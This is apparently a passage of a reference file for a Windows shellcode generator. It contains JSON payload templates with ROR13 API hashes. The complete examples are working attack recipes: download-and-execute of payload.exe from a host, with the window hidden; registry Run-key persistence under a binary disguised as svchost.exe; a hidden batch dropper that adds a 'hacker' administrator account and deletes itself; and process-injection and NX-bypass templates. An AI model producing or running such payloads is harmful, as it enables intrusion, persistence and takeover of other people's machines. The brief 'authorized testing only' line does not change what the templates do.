    dwSize (SIZE_T)    - Size of allocation in bytes
    flAllocationType (DWORD) - Allocation type:
                               0x1000 = MEM_COMMIT
                               0x2000 = MEM_RESERVE
                               0x3000 = MEM_COMMIT | MEM_RESERVE
    flProtect (DWORD)  - Memory protection:
                         0x04 = PAGE_READWRITE
                         0x20 = PAGE_EXECUTE_READ
                         0x40 = PAGE_EXECUTE_READWRITE

Returns:
    Base address of allocated memory (in EAX)

DLL: kernel32.dll
ROR13 Hash: 0x91afca54

JSON Example:
"""
VIRTUALALLOC_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "VirtualAlloc",
            "dll": "kernel32.dll",
            "args": [
                0,          # Let system choose address
                4096,       # Allocate 4KB
                0x3000,     # MEM_COMMIT | MEM_RESERVE
                0x40        # PAGE_EXECUTE_READWRITE
            ]
        }
        # Address is now in EAX - use "REG:eax" for operations
    ],
    "exit": True
}

# ------------------------------------------------------------------------------
# VirtualProtect - Change memory protection
# ------------------------------------------------------------------------------
"""
VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)

Description:
    Changes the protection on a region of committed memory pages.
    Commonly used to make shellgen executable (NX bypass).

Parameters:
    lpAddress (LPVOID)  - Starting address of region
    dwSize (SIZE_T)     - Size of region in bytes
    flNewProtect (DWORD) - New protection flags:
                           0x04 = PAGE_READWRITE
                           0x20 = PAGE_EXECUTE_READ
                           0x40 = PAGE_EXECUTE_READWRITE
    lpflOldProtect (PDWORD) - Pointer to receive old protection (use "REG:esp")

Returns:
    Non-zero if successful, 0 if error

DLL: kernel32.dll
ROR13 Hash: 0x7946c61b

JSON Example:
"""
VIRTUALPROTECT_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "VirtualAlloc",
            "dll": "kernel32.dll",
            "args": [0, 4096, 0x3000, 0x04]  # RW only
        },
        # ... write shellgen to allocated memory ...
        {
            "api": "VirtualProtect",
            "dll": "kernel32.dll",
            "args": [
                "REG:eax",  # Address from VirtualAlloc
                4096,       # Size
                0x20,       # PAGE_EXECUTE_READ (now executable)
                "REG:esp"   # Old protection (stack)
            ]
        }
        # Memory is now executable
    ],
    "exit": True
}

# ------------------------------------------------------------------------------
# WriteProcessMemory - Write to process memory
# ------------------------------------------------------------------------------
"""
WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten)

Description:
    Writes data to an area of memory in a specified process.
    Used for process injection and memory patching.

Parameters:
    hProcess (HANDLE)   - Process handle (from OpenProcess)
    lpBaseAddress (LPVOID) - Address to write to in target process
    lpBuffer (LPCVOID)  - Buffer containing data to write
    nSize (SIZE_T)      - Number of bytes to write
    lpNumberOfBytesWritten (SIZE_T*) - Receives bytes written (use "REG:esp" or 0)

Returns:
    Non-zero if successful, 0 if error

DLL: kernel32.dll
ROR13 Hash: 0xd83d6aa1

JSON Example:
"""
WRITEPROCESSMEMORY_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        # Assuming you have a process handle in EAX from OpenProcess
        {
            "api": "VirtualAllocEx",
            "dll": "kernel32.dll",
            "args": [
                "REG:eax",      # Target process handle
                0,              # Let system choose address
                4096,           # Size
                0x3000,         # MEM_COMMIT | MEM_RESERVE
                0x40            # PAGE_EXECUTE_READWRITE
            ]
        },
        {
            "api": "WriteProcessMemory",
            "dll": "kernel32.dll",
            "args": [
                "REG:ebx",      # Process handle (saved)
                "REG:eax",      # Address from VirtualAllocEx
                "shellcode_data", # Data to write
                256,            # Size
                0               # Don't need bytes written
            ]
        }
    ],
    "exit": True
}

# ------------------------------------------------------------------------------
# ReadProcessMemory - Read from process memory
# ------------------------------------------------------------------------------
"""
ReadProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead)

Description:
    Reads data from an area of memory in a specified process.
    Used for memory dumping and process inspection.

Parameters:
    hProcess (HANDLE)   - Process handle (from OpenProcess)
    lpBaseAddress (LPCVOID) - Address to read from in target process
    lpBuffer (LPVOID)   - Buffer to receive data (use "REG:esp" for stack)
    nSize (SIZE_T)      - Number of bytes to read
    lpNumberOfBytesRead (SIZE_T*) - Receives bytes read (use "REG:esp" or 0)

Returns:
    Non-zero if successful, 0 if error

DLL: kernel32.dll
ROR13 Hash: 0xef632c4a

JSON Example:
"""
READPROCESSMEMORY_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        # Assuming you have a process handle and target address
        {
            "api": "VirtualAlloc",
            "dll": "kernel32.dll",
            "args": [0, 1024, 0x3000, 0x04]  # Buffer for read data
        },
        {
            "api": "ReadProcessMemory",
            "dll": "kernel32.dll",
            "args": [
                "REG:ebx",      # Process handle
                0x00401000,     # Address to read from
                "REG:eax",      # Buffer from VirtualAlloc
                256,            # Bytes to read
                0               # Don't need bytes read count
            ]
        }
        # Data is now in buffer at EAX
    ],
    "exit": True
}


# ==============================================================================
# COMPLETE EXAMPLES
# ==============================================================================

# ------------------------------------------------------------------------------
# Example 1: Download and Execute
# ------------------------------------------------------------------------------
"""
Complete example: Download a file from the internet and execute it.
"""
DOWNLOAD_AND_EXECUTE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "URLDownloadToFileA",
            "dll": "urlmon.dll",
            "args": [
                0,
                "http://192.168.1.100:8000/payload.exe",
                "C:\\Windows\\Temp\\update.exe",
                0,
                0
            ]
        },
        {
            "api": "WinExec",
            "dll": "kernel32.dll",
            "args": [
                "C:\\Windows\\Temp\\update.exe",
                0  # Hidden
            ]
        }
    ],
    "exit": True
}

# ------------------------------------------------------------------------------
# Example 2: Persistence via Registry Run Key
# ------------------------------------------------------------------------------
"""
Complete example: Add persistence by creating a Run key that executes on login.
"""
PERSISTENCE_RUNKEY = {
    "bad_chars": [0, 10, 13],
    "calls": [
        # Copy payload to a hidden location first
        {
            "api": "CreateFileA",
            "dll": "kernel32.dll",
            "args": [
                "C:\\Windows\\System32\\svchost.exe",  # Disguised name
                0x40000000,  # GENERIC_WRITE
                0, 0, 2, 0x80, 0
            ]
        },
        # In real scenario, you'd write your payload here with WriteFile
        {
            "api": "CloseHandle",
            "dll": "kernel32.dll",
            "args": ["REG:eax"]
        },
        # Create Run key
        {
            "api": "RegCreateKeyExA",
            "dll": "advapi32.dll",
            "args": [
                0x80000001,  # HKEY_CURRENT_USER
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, 0, 0, 0xF003F, 0, "REG:esp", "REG:esp"
            ]
        },
        # Set the value
        {
            "api": "RegSetValueExA",
            "dll": "advapi32.dll",
            "args": [
                "REG:eax",
                "WindowsUpdate",
                0,
                1,  # REG_SZ
                "C:\\Windows\\System32\\svchost.exe",
                35
            ]
        },
        {
            "api": "RegCloseKey",
            "dll": "advapi32.dll",
            "args": ["REG:eax"]
        }
    ],
    "exit": True
}

# ------------------------------------------------------------------------------
# Example 3: File Dropper - Write and Execute
# ------------------------------------------------------------------------------
"""
Complete example: Write a batch file and execute it.
"""
FILE_DROPPER = {
    "bad_chars": [0, 10, 13],
    "calls": [
        # Create the batch file
        {
            "api": "CreateFileA",
            "dll": "kernel32.dll",
            "args": [
                "C:\\Windows\\Temp\\update.bat",
                0x40000000,  # GENERIC_WRITE
                0, 0, 2, 0x80, 0
            ]
        },
        # Write the batch commands
        {
            "api": "WriteFile",
            "dll": "kernel32.dll",
            "args": [
                "REG:eax",
                "@echo off\r\nnet user hacker Password123! /add\r\nnet localgroup administrators hacker /add\r\n",
                80,
                "REG:esp",
                0
            ]
        },
        # Close the file
        {
            "api": "CloseHandle",
            "dll": "kernel32.dll",
            "args": ["REG:eax"]
        },
        # Execute it hidden
        {
            "api": "WinExec",
            "dll": "kernel32.dll",
            "args": [
                "C:\\Windows\\Temp\\update.bat",
                0  # Hidden
            ]
        },
        # Clean up
        {
            "api": "Sleep",
            "dll": "kernel32.dll",
            "args": [2000]  # Wait 2 seconds for completion
        },
        {
            "api": "DeleteFileA",
            "dll": "kernel32.dll",
            "args": ["C:\\Windows\\Temp\\update.bat"]
        }
    ],
    "exit": True
}

# ------------------------------------------------------------------------------
# Example 4: Multiple Message Boxes (Testing)
# ------------------------------------------------------------------------------
"""
Simple example for testing: Show multiple message boxes in sequence.
"""
MULTIPLE_MESSAGEBOXES = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "MessageBoxA",
            "dll": "user32.dll",
            "args": [0, "Step 1: Shellcode is running", "Info", 0x40]
        },
        {
            "api": "MessageBoxA",
            "dll": "user32.dll",
            "args": [0, "Step 2: Everything is working", "Info", 0x40]
        },
        {
            "api": "MessageBoxA",
            "dll": "user32.dll",
            "args": [0, "Step 3: Ready to deploy payload", "Warning", 0x30]
        }
    ],
    "exit": True
}


# ==============================================================================
# USAGE TIPS
# ==============================================================================
"""
TIPS FOR CREATING CUSTOM PAYLOADS:

1. START SIMPLE
   - Begin with a single API call (like MessageBoxA)
   - Test it works before adding more complexity

2. USE REGISTER REFERENCES
   - "REG:eax" = Return value from previous API call
   - "REG:esp" = Stack pointer (for passing pointers)
   - Example: CreateFileA returns handle in EAX

3. CHECK STRING LENGTHS
   - Count bytes carefully for WriteFile, RegSetValueExA, etc.
   - Include null terminators where needed

4. HANDLE BAD CHARACTERS
   - Specify your bad chars in the "bad_chars" array
   - The encoder will avoid them in immediate values
   - If opcodes contain bad chars, use --debug-shellgen to find them

5. TEST INCREMENTALLY
   - Add one API call at a time
   - Use --verify to check for bad characters
   - Use --debug-shellgen to find problematic instructions

6. COMMON PATTERNS
   - File operations: CreateFileA → WriteFile → CloseHandle
   - Registry: RegCreateKeyExA → RegSetValueExA → RegCloseKey
   - Download + Execute: URLDownloadToFileA → WinExec
   - Process control: GetCurrentProcess → TerminateProcess

7. SECURITY CONSIDERATIONS
   - This is for authorized testing only
   - Always get explicit permission
   - Document your testing activities
   - Clean up after testing

8. DEBUGGING
   - If assembly fails, check API parameter counts
   - If shellgen has bad chars, use different registers
   - If execution fails, verify DLL names are correct
   - Use --format asm to review generated code

EXAMPLE COMMAND:
    # Save one of the examples above to a file
    # Then generate shellgen:
    ./shellgen.sh --platform windows --json my_payload.json --arch x86 --format python

GENERATE HASHES:
    # If you need to verify API hashes:
    ./hashgen.sh WinExec CreateFileA WriteFile
"""

# ==============================================================================
# COMMON API HASHES (ROR13)
# ==============================================================================
"""
These hashes are used internally by shellgen for API resolution.
You don't need to specify them in JSON - they're automatic.

Kernel32.dll:
    LoadLibraryA      : 0xec0e4e8e
    GetProcAddress    : 0x7c0dfcaa
    WinExec           : 0x0e8afe98
    CreateProcessA    : 0x16b3fe72
    ExitProcess       : 0x73e2d87e
    TerminateProcess  : 0x78b5b983
    GetCurrentProcess : 0x7b8f17e6
    CreateFileA       : 0x7c0017a5
    WriteFile         : 0xe80a791f
    ReadFile          : 0xbb5f9ead
    CloseHandle       : 0x0ffd97fb
    DeleteFileA       : 0x13dd2ed7
    VirtualAlloc      : 0x91afca54
    VirtualProtect    : 0x7946c61b
    WriteProcessMemory: 0xd83d6aa1
    ReadProcessMemory : 0xef632c4a
    Sleep             : 0xe035f044

User32.dll:
    MessageBoxA       : 0xbc4da2a8
    MessageBoxW       : 0x8f497d9c

Shell32.dll:
    ShellExecuteA     : 0x34a8f6f5

Urlmon.dll:
    URLDownloadToFileA: 0xc69f8957

Ws2_32.dll:
    WSAStartup        : 0x3bfcedcb
    WSASocketA        : 0xadf509d9
    WSAConnect        : 0xb32dba0c
    socket            : 0x6174a599
    connect           : 0x4a5af2f9
    bind              : 0xf0b5a256
    listen            : 0x38d42e6d
    accept            : 0xc7fb08d0
    send              : 0x5f38ebc2
    recv              : 0x5fc8d902
    closesocket       : 0x23e2d9f1

Advapi32.dll:
    RegCreateKeyExA   : 0x7e9d4bc3
    RegSetValueExA    : 0x8e4e0eeb
    RegCloseKey       : 0x29f7ce0d

Msvcrt.dll:
    system            : 0xe4a8f8d5
"""